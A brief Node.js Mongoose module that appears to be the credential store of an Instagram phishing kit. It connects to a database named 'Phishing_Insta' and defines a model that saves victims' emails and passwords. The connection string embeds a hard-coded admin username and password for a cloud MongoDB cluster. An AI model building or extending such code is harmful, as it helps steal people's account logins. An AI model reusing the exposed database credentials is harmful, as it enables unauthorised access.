const mongoose = require("mongoose")


mongoose.connect('mongodb+srv://admin:1234567890@cluster0.rxlttmc.mongodb.net/Phishing_Insta');

const Schema = mongoose.Schema;

const Cred = new Schema({
  email:String,
  password:String
});

const CredModal = mongoose.model('UsersCred', Cred);


module.exports={
    CredModal
}